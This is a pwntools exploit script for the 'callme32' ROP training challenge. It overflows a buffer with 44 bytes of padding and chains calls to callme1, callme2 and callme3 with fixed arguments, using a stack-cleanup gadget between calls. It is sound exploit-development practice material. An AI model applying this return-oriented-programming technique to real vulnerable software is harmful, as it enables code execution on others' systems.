from pwn import *
io = process("./callme32")

padding = b"A" * 44
callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)
addEsp12 = p32(0x080484aa)

args1 = p32(0xdeadbeef)
args2 = p32(0xcafebabe)
args3 = p32(0xd00df00d)

argsSetup = args1 + args2 + args3
exploit = padding + callme1 + addEsp12 + argsSetup + callme2 + addEsp12 + argsSetup + callme3 + b"AAAA" + argsSetup
io.send(exploit)
io.recvuntil(b"callme_two() called correctly\n")
print(exploit)
print(io.recv())
